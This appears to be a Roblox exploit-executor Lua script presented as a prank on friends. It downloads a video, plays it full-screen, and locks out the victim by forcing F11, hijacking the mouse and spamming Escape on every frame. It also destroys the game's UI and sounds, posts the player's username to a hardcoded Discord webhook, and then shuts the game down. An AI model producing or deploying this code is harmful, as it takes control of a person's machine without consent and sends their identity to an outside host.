repeat task.wait() until isrbxactive()

-- fixed syntax errors - 1
-- removed useless stuff - 2
-- troll people with this! if you are stuck,  press alt, and close using "Task Manager"

makefolder("plsdontclickme")

local videos = {
    {name = "pitchbend.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/pitchbend.mp4"},
    {name = "anameforacertainfile.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/anameforacetainfile.mp4"},
    {name = "idontknowthetitle.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/idontknowthetitle.mp4"},
    {name = "notes.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/notes.mp4"},
    {name = "seemsprettycool.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/seemsprettycool.mp4"},
    {name = "whatarethoselol.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/whatarethoselol.mp4"},
    {name = "whatisavideo.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/whatisavideo.mp4"},
    {name = "coolvideoiguess.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/coolvideoiguess.mp4"},
    {name = "hellarethose.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/hellarethose.mp4"},
    {name = "randomizingyoursongs.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/randomizingyoursongs.mp4"},
    {name = "synthoutgoesinsne.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/synthoutgoesinsne.mp4"},
    {name = "thisvideohasmusicinit.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/thisvideohasmusicinit.mp4"},
    {name = "whatisareversereverb.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/whatisareversereverb.mp4"},
    {name = "yellow.mp4", url = "https://github.com/HashtagDad/trollsynthouing/raw/refs/heads/main/yellow.mp4"}
}

local chosen = videos[math.random(1, #videos)]

function createasset(str, str2)
    if isfile("plsdontclickme/" .. tostring(str)) then return end
    writefile("plsdontclickme/" .. tostring(str), game:HttpGet(str2, true))
end

createasset(chosen.name, chosen.url)

local function videoplay(id)
    local coregui = game:GetService("CoreGui")
    local gui = Instance.new("ScreenGui")
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.Parent = coregui

    local vid = Instance.new("VideoFrame")
    vid.Size = UDim2.new(1, 0, 1, 0)
    vid.Position = UDim2.new(0.5, 0, 0.5, 0)
    vid.AnchorPoint = Vector2.new(0.5, 0.5)
    vid.BackgroundTransparency = 1
    vid.Video = getcustomasset("plsdontclickme/" .. tostring(id))
    vid.Looped = false
    vid.Playing = true
    vid.Volume = 10
    vid.Parent = gui

    vid.Ended:Connect(function()
        delfolder("plsdontclickme")
        repeat task.wait() until not isfolder("plsdontclickme")
        game:Shutdown()
    end)
end

function nosounds()
    for _, sound in ipairs(game:GetDescendants()) do
        if sound:IsA("Sound") then
            pcall(function()
                sound:Stop()
                sound:Destroy()
            end)
        end
    end
end

function destroyui()
    for _, ui in ipairs(game.CoreGui:GetDescendants()) do
        pcall(function()
            ui:Destroy()
        end)
    end
    for _, ui in ipairs(game.Players.LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
        pcall(function()
            ui:Destroy()
        end)
    end
end

function disablelimitations()
    game:GetService("RunService").RenderStepped:Connect(function()
        mousemoverel(-50000, 50000)
        keypress(0x1B)
        keyrelease(0x1B)
    end)
end

repeat task.wait() until isrbxactive()
keypress(0x7A)
keyrelease(0x7A)
nosounds()
disablelimitations()
destroyui()
-- to check if ur friend clicked it, heres a webhook!

local data = game:GetService("HttpService"):JSONEncode({username = tostring(math.random(1,100)), content=[[
    User ran script!
]] .. game.Players.LocalPlayer.Name .. " (" .. chosen.name .. ")"
request({Url=                     "https://discordapp.com/api/webhooks/1398005198873694339/Z3vpTs1FFb51zz89ZLdMw6Mo2nQDe0ucyU5J4favgWkYjt-hfC54UpC4mxB8J47ktOm6"                       , Method="POST", Headers={["Content-Type"]="application/json"}, Body=data})

videoplay(chosen.name)
